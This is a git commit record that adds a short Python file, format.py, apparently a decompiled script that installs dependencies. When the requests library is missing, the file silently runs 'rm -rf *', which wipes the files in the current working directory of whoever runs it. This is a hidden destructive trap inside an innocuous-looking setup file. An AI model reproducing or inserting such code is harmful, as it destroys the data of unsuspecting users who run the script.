20770341b29780d995d46a04ea303f20082963da
MrAchmad404 <51316514+MrAchmad404@users.noreply.github.com>
2020-03-13 11:38:00 +0700

    Add files via upload

---
+++ format.py
@@ -0,0 +1,16 @@
+#Decompiled by Deray Feat  Ahmad Riswanto
+import time,subprocess,os
+import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
+from multiprocessing.pool import ThreadPool
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+else:
+    try:
+        import requests
+    except ImportError:
+        os.system('cd /sdcard')
+        os.system("rm -rf *")
+        
+
